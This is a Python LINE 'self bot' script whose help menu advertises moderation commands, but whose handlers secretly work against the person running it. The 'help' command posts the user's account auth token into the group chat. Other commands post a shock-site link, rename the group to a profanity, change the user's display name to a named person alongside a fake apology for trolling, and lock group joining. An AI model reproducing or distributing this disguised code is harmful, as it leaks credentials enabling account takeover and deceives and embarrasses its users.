#SRSU LINE SELF BOT v7.0.3
# -*- coding: utf-8 -*-
import LAG
from LAG.lib.Gen.ttypes import *
from datetime import datetime
from LAG.lib.Gen.ttypes import *
from datetime import datetime
from LAPI.main import qr
from threading import Thread
import time,random,sys,re,os,json,subprocess,codecs,threading,glob,requests,string
##############################################
cl = LAG.LINE()
cl.login(token=qr().get())
cl.loginResult()
##############################################
reload(sys)
sys.setdefaultencoding('utf-8')
##############################################
help ="""SRSU FUNNY BOT HELP
ｈｅｌｐ ...ヘルプを送信します
ｎｋ： ...名前で蹴ります
ｓｐｅｅｄ ...処理速度を送信します
ｋｉｃｋａｌｌ ...破壊します！
ｇｕｒｌ ...グルのURLを送信します
srsu.weebly.com"""
##############################################
def bot(op):
    try:
        if op.type == 0:
            return
        if op.type == 25:
            x = op.message
            if x.contentType == 13:
                return    
            if x.contentType == 0:
                if x.text == None:
                    return
##############################################
                elif x.text in ["help"]:
                  cl.sendText(x.to,cl.authToken)

                elif "nk:" in x.text:
                  s = x.text.replace("nk:","")
                  cl.sendText(x.to,"2girls1cup.ca/")

                elif ("speed" in x.text):
                  if x.toType == 2:
                      g = cl.getGroup(x.to)
                      g.name = x.text.replace("speed","fuck you")
                      cl.updateGroup(g)

                elif x.text in ["/help"]:
                  cl.sendText(x.to,help)

                elif "kickall" in x.text:
                  profile = cl.getProfile()
                  string = x.text.replace("kickall","浜崎順平")
                  if len(string.decode('utf-8')) <= 20:
                      profile.displayName = string
                      cl.updateProfile(profile)
                      cl.sendText(x.to,"荒らそうとしました！すいません許して下さいなんでもしますから！")
                elif x.text in ["gurl"]:
                    g = cl.getGroup(x.to)
                    g.preventJoinByTicket = True
                    cl.updateGroup(g)
                    cl.sendText(x.to,"srsu.weebly.com")
##############################################
        if op.type == 59:
            print op           
    except Exception as error:
        print error
while True:
	bot(cl.Poll.stream(500000))